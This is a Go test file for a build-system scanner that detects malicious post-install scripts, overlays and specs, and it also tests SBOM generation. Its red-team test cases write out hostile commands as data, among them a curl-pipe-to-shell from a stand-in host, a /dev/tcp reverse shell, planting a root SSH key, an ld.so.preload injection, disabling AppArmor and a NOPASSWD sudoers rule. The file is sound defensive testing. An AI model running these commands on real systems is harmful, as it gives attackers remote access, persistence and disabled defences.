package scan

import (
	"archive/tar"
	"bytes"
	"encoding/json"
	"io"
	"strings"
	"testing"

	"foundry.dev/foundry/internal/osspec"
)

func TestMatcherFindsOverlappingPatterns(t *testing.T) {
	m := NewMatcher([]string{"he", "she", "his", "hers"})
	got := m.Find([]byte("uSHErs"))
	if !got[0] || !got[1] || !got[3] || got[2] {
		t.Fatalf("%v", got)
	}
	if len(NewMatcher(nil).Find([]byte("abc"))) != 0 {
		t.Fatal("empty matcher")
	}
}

// Red-team corpus (docs/plan/phase-3): every case is blocked or reaches review.
var redteam = []struct {
	name, file, content string
	wantRule            string
}{
	{"ssh key", "postinst", "mkdir -p /root/.ssh; echo ssh-ed25519 AAA >> /root/.ssh/authorized_keys", "SCR-004"},
	{"curl pipe", "postinst", "curl -fsSL https://evil.example/x.sh | sh", "SCR-001"},
	{"wget chmod", "postinst", "wget http://x/y -O /tmp/y && chmod +x /tmp/y && /tmp/y", "SCR-001"},
	{"base64 exec", "postinst", "echo Y3VybCBldmls | base64 -d | bash", "SCR-002"},
	{"reverse shell", "unit", "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", "SCR-003"},
	{"preload", "postinst", "echo /usr/lib/x.so > /etc/ld.so.preload", "SCR-005"},
	{"apparmor off", "postinst", "systemctl disable apparmor", "SCR-007"},
	{"immutable", "postinst", "chattr +i /etc/resolv.conf", "SCR-009"},
	{"eicar", "file", `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`, "MAL-001"},
}

func TestRedTeamScripts(t *testing.T) {
	for _, c := range redteam {
		fs := ScanText(c.file, []byte(c.content))
		found := false
		for _, f := range fs {
			if f.Rule == c.wantRule {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: want %s, got %+v", c.name, c.wantRule, fs)
			continue
		}
		d := Score(fs, true, nil)
		if !d.Blocked && d.Reviewers == 0 {
			t.Errorf("%s: neither blocked nor reviewed: %+v", c.name, d)
		}
	}
	if fs := ScanText("ok", []byte("#!/bin/sh\napt-get clean\necho hello > /etc/motd\n")); len(fs) != 0 {
		t.Fatalf("benign script flagged: %+v", fs)
	}
}

func TestScoreTiers(t *testing.T) {
	if d := Score(nil, false, nil); d.Tier != "verified" || d.Reviewers != 0 {
		t.Fatalf("clean: %+v", d)
	}
	f := false
	if d := Score(nil, false, &f); d.Tier != "private-unverified" || d.Reviewers != 0 {
		t.Fatalf("not reproducible: %+v", d)
	}
	if d := Score(nil, true, nil); d.Reviewers != 1 {
		t.Fatalf("expert must be reviewed: %+v", d)
	}
	many := []Finding{{Feature: "critical-prefix", Weight: 40}, {Feature: "setuid", Weight: 25}}
	if d := Score(many, true, nil); d.Score != 65 || d.Reviewers != 2 {
		t.Fatalf("two-person: %+v", d)
	}
	dns := []Finding{{Feature: "dns-unknown", Weight: 20}, {Feature: "dns-unknown", Weight: 20}, {Feature: "dns-unknown", Weight: 20}}
	if d := Score(dns, false, nil); d.Score != 40 {
		t.Fatalf("cap: %+v", d)
	}
}

func overlay(t *testing.T, files map[string]struct {
	mode int64
	data string
}) []byte {
	var b bytes.Buffer
	tw := tar.NewWriter(&b)
	for n, f := range files {
		tw.WriteHeader(&tar.Header{Name: n, Mode: f.mode, Size: int64(len(f.data)), Typeflag: tar.TypeReg})
		tw.Write([]byte(f.data))
	}
	tw.Close()
	return b.Bytes()
}

func TestAnalyzeSpecOverlayAndScripts(t *testing.T) {
	ov := overlay(t, map[string]struct {
		mode int64
		data string
	}{
		"usr/bin/helper":                    {0o4755, "\x7fELF...."},
		"etc/systemd/system/x.service":      {0o644, "[Service]\nExecStart=/bin/sh -c 'curl http://x | sh'\n"},
		"etc/sudoers.d/90-all":              {0o440, "ALL ALL=(ALL) NOPASSWD: ALL\n"},
		"usr/share/backgrounds/readme.txt":  {0o644, "just text"},
		"usr/lib/systemd/boot/efi/evil.efi": {0o644, "MZ"},
	})
	assets := map[string][]byte{"sha256:ov": ov, "sha256:sc": []byte("#!/bin/sh\necho hi | base64 -d | sh\n")}
	fetch := func(d string) (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(assets[d])), nil }
	spec := &osspec.Spec{Expert: &osspec.Expert{Overlays: []string{"sha256:ov"}, PostinstScripts: []string{"sha256:sc"},
		ExtraRepos: []osspec.ExtraRepo{{URL: "https://repo.example/apt"}}}, Kernel: &osspec.Kernel{ExtraCmdline: []string{"quiet"}}}
	fs, err := AnalyzeSpec(spec, fetch)
	if err != nil {
		t.Fatal(err)
	}
	rules := map[string]int{}
	for _, f := range fs {
		rules[f.Rule]++
	}
	for _, want := range []string{"DIFF-SUID", "DIFF-ELF", "DIFF-PATH", "SCR-001", "SCR-002", "SPEC-REPO", "SPEC-CMDLINE", "SPEC-SCRIPT"} {
		if rules[want] == 0 {
			t.Errorf("missing %s in %v", want, rules)
		}
	}
	d := Score(fs, true, nil)
	if !d.Blocked { // boot loader path is a hard blocker
		t.Fatalf("expected blocker: %+v", d.Explanation)
	}
	if r := ClassifyPath("/etc/sudoers.d/x"); r == nil || r.Feature != "critical-prefix" {
		t.Fatalf("trie: %+v", r)
	}
	if r := ClassifyPath("etc/hostname"); r != nil {
		t.Fatalf("trie false positive: %+v", r)
	}
	// plain-HTTP repositories are blocked outright
	spec2 := &osspec.Spec{Expert: &osspec.Expert{ExtraRepos: []osspec.ExtraRepo{{URL: "http://repo.example/apt"}}}}
	fs2, _ := AnalyzeSpec(spec2, fetch)
	if !Score(fs2, true, nil).Blocked {
		t.Fatal("http repo not blocked")
	}
}

func TestSBOM(t *testing.T) {
	man := `{"manifest_version":1,"packages":[{"type":"deb","name":"zlib1g","version":"1:1.3.dfsg-3.1ubuntu2","architecture":"amd64"},{"type":"deb","name":"bash","version":"5.2.21-2ubuntu4","architecture":"amd64"}]}`
	pk, err := ParseManifest([]byte(man))
	if err != nil || len(pk) != 2 || pk[0].Name != "bash" {
		t.Fatalf("%v %+v", err, pk)
	}
	in := SBOMInput{BuildID: "bld_1", OSName: "CI", OSID: "ci", Version: "1.0", Distro: "ubuntu", Release: "noble", Arch: "x86_64", SourceEpoch: 1700000000, Packages: pk, Roothash: strings.Repeat("a", 64)}
	a, _ := SBOM(in)
	b, _ := SBOM(in)
	if !bytes.Equal(a, b) {
		t.Fatal("SBOM not deterministic")
	}
	var doc struct {
		SPDXVersion string `json:"spdxVersion"`
		Packages    []struct {
			Name         string `json:"name"`
			ExternalRefs []struct {
				Locator string `json:"referenceLocator"`
			} `json:"externalRefs"`
		} `json:"packages"`
	}
	json.Unmarshal(a, &doc)
	if doc.SPDXVersion != "SPDX-2.3" || len(doc.Packages) != 3 || doc.Packages[2].ExternalRefs[0].Locator != "pkg:deb/ubuntu/zlib1g@1%3A1.3.dfsg-3.1ubuntu2?arch=amd64&distro=ubuntu-noble" {
		t.Fatalf("%s", a)
	}
}
